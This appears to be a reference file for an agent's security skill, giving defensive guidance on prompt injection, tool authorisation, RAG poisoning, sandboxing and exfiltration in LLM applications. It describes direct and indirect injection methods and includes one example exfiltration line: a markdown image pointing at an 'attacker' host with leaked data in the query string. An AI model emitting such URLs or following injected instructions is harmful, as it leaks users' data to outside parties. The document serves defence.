# AI agent and LLM application security

Reference for the `security` skill. Threats specific to applications built
on LLMs and tool-using agents. Consult itself is one of these.

## Threat model

The model is a parser of untrusted strings whose outputs influence privileged
actions. Anything that reaches the context window is input. Anything the
model emits is output that may drive a tool call, an HTTP fetch, a file
write, or a database query. Treat both surfaces as trust boundaries.

## Prompt injection

Direct: a user prompt instructs the model to ignore its system prompt or
take an action it should not.

Indirect: untrusted text reaches the model via a fetched URL, an uploaded
document, a file the agent reads, a tool's output, an email, a calendar
invite, or a code comment. The text contains instructions the model
follows.

Mitigations:

- Treat every external content channel as untrusted input. Tool outputs,
  fetched URLs, file contents, search results, all of them. Wrapping them
  in delimiters and telling the model the content is data reduces
  injection but does not prevent it. It is not a control; the controls
  below are.
- Capability isolation. The model that *summarises a webpage* must not
  have a tool that *sends email*. If both are needed, use two agents with
  disjoint tool sets and a structured (typed) handoff between them.
- Approve-before-act for high-impact tools. Writes, sends, deletions,
  payments, code execution: gate behind a human confirmation step or a
  separate, lower-trust agent.
- Output structure. When the agent must produce a parameter for a tool,
  require it to emit JSON conforming to a schema; reject anything that
  does not match. Do not pass free text to a shell, SQL, or fetch.
- No hidden instructions. Render content in the UI exactly as the model
  saw it. Hidden prompt-injection in white-on-white text or zero-width
  characters is a known attack.

## System prompt is not a secret store

The system prompt is in plaintext in the request; any model can be coaxed
into emitting it. Do not put credentials, API keys, customer data, or PII
in the system prompt. Use tools to fetch what the model needs, and
authorise the tool, not the model.

## Tool / function calling

- Treat tool outputs as untrusted input to the next model turn (see prompt
  injection).
- Parameter validation: the model can emit any string. Validate the
  parameters against a schema and reject out-of-range values before
  invoking the tool.
- **Authorise inside the tool, not in the prompt.** "You may only access
  files in /workspace" in the system prompt is documentation, not a
  control. The tool itself must enforce the path prefix and refuse
  symlinks, `..`, absolute paths.
- Tool error messages return to the model. Strip secrets, internal paths,
  and stack traces.
- Rate limit tool invocations per agent run; bound total cost and execution
  time. Detect and break infinite tool-call loops.

## Data exfiltration vectors

The model can leak data even without an explicit "send" tool:

- Markdown image URLs. A model rendering `![](https://attacker/log?data=...)`
  in a chat UI causes the user's browser to fetch the URL: exfiltration via
  the user. Sanitise model output: strip image URLs to known-safe domains
  or render with `referrerpolicy=no-referrer` and CSP `img-src` allowlist.
- Hyperlinks. Same problem, gated on user click. Render link text and
  destination side-by-side; warn on cross-origin links to unknown domains.
- Citations / footnote URLs with query parameters carrying the leaked
  data. Validate URL structure.
- Tool calls themselves. If the agent has any tool that accepts a URL
  (fetch, webhook, redirect), apply the egress controls in
  `ssrf-and-egress.md`.
- Indirect leakage to other users. A multi-tenant agent that remembers
  context across turns can leak Tenant A's data into Tenant B's session.
  Pin the agent's memory to the actor on every turn.

## RAG / retrieval pipelines

- The retrieval index is a write surface. If users can author documents
  that get indexed, they can plant indirect prompt injections that fire
  when other users query.
- Per-tenant indexes (or per-user filters enforced at retrieval time, not
  in the prompt) for any private corpus.
- Stripping control characters and known injection markers from indexed
  documents removes some noise. It is not a control: injected
  instructions need no special markers.
- Citations: show the user what was retrieved so they can spot manipulated
  context.

## Model and prompt provenance

- Pin model identifiers and versions in code; do not let untrusted callers
  pick the model.
- System prompts checked into source control; review changes; treat them as
  code.
- Audit log: actor, model, system-prompt version, tools invoked, tool
  arguments (redacted), final output. Required for incident response.

## Output handling on the host

- Never `eval` or `exec` model output without a sandbox. If the agent
  generates code to run, run it in a container/VM with no network, no
  secrets, no host filesystem mount, and a hard time/memory cap.
- For shell or SQL emitted by the model, require it match an allowlist of
  commands or parameterised templates.
- Markdown rendering: sanitise (DOMPurify or equivalent); restrict
  `img-src` and `script-src` via CSP on the rendering surface.

## Multi-agent and chained-LLM systems

- Each handoff is a trust boundary. Validate the handed-off payload as
  schemas, not free text.
- A compromised sub-agent should not escalate to the parent. Sub-agents run
  with the minimum tool set their task requires.
- Supervision: log every sub-agent invocation with the parent context so a
  prompt injection can be traced backwards.

## See also

- `ssrf-and-egress.md` for egress controls on agent-issued HTTP fetches.
- `secrets.md` for how to keep credentials out of the model context.
- `web-app.md` for output rendering of model-emitted markdown / HTML.
